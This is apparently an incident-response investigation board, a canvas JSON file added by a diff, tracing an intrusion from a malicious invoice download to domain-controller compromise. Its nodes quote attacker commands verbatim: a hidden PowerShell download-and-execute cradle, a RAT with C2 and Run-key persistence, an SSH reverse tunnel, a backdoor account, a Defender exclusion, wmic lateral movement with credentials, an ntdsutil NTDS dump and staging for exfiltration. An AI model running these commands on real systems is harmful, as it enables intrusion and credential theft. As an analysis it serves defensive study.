@@ -1,0 +1,43 @@
+{
+	"nodes":[
+		{"id":"bd83f917c33bf08a","type":"text","text":"2025-07-17 19:40:40\nC:\\Users\\danderson\\AppData\\Roaming\\hkcJM8qC\\netsupport.exe","x":-17,"y":170,"width":335,"height":120},
+		{"id":"cd0d59cd17db708a","type":"text","text":"2025-07-17 20:29:13\nsetup ssh service\n\nschtasks.exe /create /sc minute /mo 1 /tn \"SSH Key Exchange\" /rl highest /tr \"C:\\ProgramData\\sshd\\ssh.exe -i C:\\ProgramData\\sshd\\config\\keys\\id_rsa -N -R 369:127[.]0[.]0[.]1:2222 root@10[.]10[.]5[.]142 -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=15\"","x":-1110,"y":390,"width":550,"height":220},
+		{"id":"fdd50228f9e93aec","type":"text","text":"2025-07-17 19:40:41\nset autorun for persistence\n\nHKU\\S-1-5-21-3865674213-28386648-2675066931-1162\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\NetSupport","x":-1107,"y":170,"width":550,"height":160},
+		{"id":"4934578abfb937c8","type":"text","text":"2025-07-17 19:40:44\nConnect to C2\n10[.]10[.]5[.]100","x":-765,"y":0,"width":205,"height":120},
+		{"id":"0cc5e68ab5189db5","type":"text","text":"2025-07-17 21:09:38\n\nadd a new account\n\nnet user WDAGUtilityAccount2 Decryptme1488@ /add","x":-1030,"y":670,"width":470,"height":160},
+		{"id":"3f292d74c4ec5a7b","type":"text","text":"2025-07-17 19:52:49\nnet user ServiceAdmin /domain","x":-309,"y":565,"width":292,"height":90},
+		{"id":"5ec425bd274ec2ab","type":"text","text":"2025-07-17 21:14:50\nadd esclusion for a directory\npowershell \"Add-MpPreference -ExclusionPath 'C:\\Users\\Public'\"","x":40,"y":548,"width":412,"height":124},
+		{"id":"bba80331dc1f7571","type":"text","text":"wmic /node:10[.]10[.]11[.]216 /user:aclark /password:vm96Dva! process call create \"netsh advfirewall firewall add rule dir=in name=^\\\"DCOM^\\\" program=C:\\Windows\\System32\\svchost.exe service=rpcss action=allow protocol=TCP localport=135\"","x":500,"y":580,"width":465,"height":160},
+		{"id":"e9209671f8893e0c","type":"text","text":"wmic /node:10[.]10[.]11[.]216 /user:aclark /password:vm96Dva! process call create \"netsh advfirewall firewall show rule name=^\\\"DCOM^\\\"\"","x":500,"y":831,"width":465,"height":109},
+		{"id":"e5cc2a2e75ce2097","type":"text","text":"wmic /node:10.10.11.216 /user:aclark /password:vm96Dva! process call create \"netsh advfirewall firewall add rule dir=in name=\\\"WMI\\\" program=C:\\Windows\\System32\\svchost.exe service=winmgmt action=allow protocol=TCP localport=any\"","x":500,"y":1019,"width":465,"height":181},
+		{"id":"e51c78dc1d51091f","type":"text","text":"host: DC01\nIP: 10.10.11.216","x":1340,"y":826,"width":200,"height":74,"color":"4"},
+		{"id":"f6d4bc9b09aba2c1","type":"text","text":"2025-07-17 19:44:03\n\"C:\\Windows\\system32\\ntdsutil.exe\" \"ac i ntds\" ifm \"create full c:\\ProgramData\\ntdsutil\" q q","x":1228,"y":560,"width":425,"height":100},
+		{"id":"b8ce4db2e7943e5d","x":1720,"y":780,"width":540,"height":166,"type":"text","text":"2025-07-18 01:08:15\narchive data for later exfiltration\n\npowershell  -c Compress-Archive -Path C:\\ProgramData\\ntdsutil -DestinationPath C:\\Data_backup_20250716.zip"},
+		{"id":"3a5b47fa06b78d82","type":"text","text":"HostUrl=http://10[.]10[.]5[.]142/Invoices.zip","x":-228,"y":-660,"width":250,"height":60},
+		{"id":"345875002064315e","type":"text","text":"2025-07-17 19:38:33\nC:\\Users\\danderson\\Downloads\\Invoices\\Invoice_2326.js\n\nMD5=447331DA4F1607244D4B937448780C99","x":384,"y":-539,"width":250,"height":170},
+		{"id":"18c5b16ca3d1f4a2","type":"text","text":"2025-07-17 19:38:16\ndownload C:\\Users\\danderson\\Downloads\\Invoices.zip","x":-293,"y":-506,"width":380,"height":104},
+		{"id":"8cfad210267deb55","type":"text","text":"2025-07-17 19:39:23\n\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -WindowStyle Hidden -Command \"IEX ((New-Object System.Net.WebClient).DownloadString('http://10[.]10[.]5[.]142/update.ps1'))\"","x":269,"y":-180,"width":480,"height":180},
+		{"id":"14ce8178d6a3705f","type":"text","text":"Victim\nHost: IT-WS01\nUser: CORP\\danderson","x":-765,"y":-500,"width":250,"height":93,"color":"4"},
+		{"id":"8fec4e773270674c","type":"text","text":"2025-07-17 21:36:24\n\naccess lsass.exe and dump credentials","x":785,"y":185,"width":360,"height":90}
+	],
+	"edges":[
+		{"id":"063e66048faa648a","fromNode":"18c5b16ca3d1f4a2","fromSide":"top","toNode":"3a5b47fa06b78d82","toSide":"bottom"},
+		{"id":"d0bf394f0fcc3e36","fromNode":"14ce8178d6a3705f","fromSide":"right","toNode":"18c5b16ca3d1f4a2","toSide":"left"},
+		{"id":"109345bd352a2f42","fromNode":"18c5b16ca3d1f4a2","fromSide":"right","toNode":"345875002064315e","toSide":"left","label":"extract"},
+		{"id":"4989fbecc084d47b","fromNode":"345875002064315e","fromSide":"bottom","toNode":"8cfad210267deb55","toSide":"top","label":"execute and download payload"},
+		{"id":"eedfb14a32156dc5","fromNode":"8cfad210267deb55","fromSide":"left","toNode":"bd83f917c33bf08a","toSide":"top","label":"create"},
+		{"id":"b733bfad0fb571c4","fromNode":"bd83f917c33bf08a","fromSide":"left","toNode":"4934578abfb937c8","toSide":"right","label":"connect"},
+		{"id":"8b800190727c88f4","fromNode":"bd83f917c33bf08a","fromSide":"left","toNode":"fdd50228f9e93aec","toSide":"right","label":"set registry value"},
+		{"id":"645dc28c83ae2d88","fromNode":"bd83f917c33bf08a","fromSide":"left","toNode":"cd0d59cd17db708a","toSide":"right","label":"setup"},
+		{"id":"5325c28b10cda87c","fromNode":"bd83f917c33bf08a","fromSide":"left","toNode":"0cc5e68ab5189db5","toSide":"right"},
+		{"id":"d541e65e3ac1b317","fromNode":"bd83f917c33bf08a","fromSide":"bottom","toNode":"3f292d74c4ec5a7b","toSide":"top","label":"discovery"},
+		{"id":"b280b5e83a0748f4","fromNode":"bd83f917c33bf08a","fromSide":"bottom","toNode":"5ec425bd274ec2ab","toSide":"top","label":"Evasion"},
+		{"id":"6d143454c37d35ce","fromNode":"bd83f917c33bf08a","fromSide":"bottom","toNode":"bba80331dc1f7571","toSide":"top","label":"Lateral Movement"},
+		{"id":"787cbe6383658063","fromNode":"bba80331dc1f7571","fromSide":"bottom","toNode":"e9209671f8893e0c","toSide":"top"},
+		{"id":"1813e44ccdbb80f9","fromNode":"e9209671f8893e0c","fromSide":"bottom","toNode":"e5cc2a2e75ce2097","toSide":"top"},
+		{"id":"77e9f6a82e7f7222","fromNode":"bd83f917c33bf08a","fromSide":"right","toNode":"8fec4e773270674c","toSide":"left","label":"EC = 10"},
+		{"id":"ea27a906ab099491","fromNode":"e5cc2a2e75ce2097","fromSide":"right","toNode":"e51c78dc1d51091f","toSide":"left","label":"move to"},
+		{"id":"1fd2ff50669c0678","fromNode":"e51c78dc1d51091f","fromSide":"top","toNode":"f6d4bc9b09aba2c1","toSide":"bottom","label":"dump DC database using ntdsutil.exe"},
+		{"id":"3277bb91873fa25f","fromNode":"e51c78dc1d51091f","fromSide":"right","toNode":"b8ce4db2e7943e5d","toSide":"left","label":"archive"}
+	]
+}
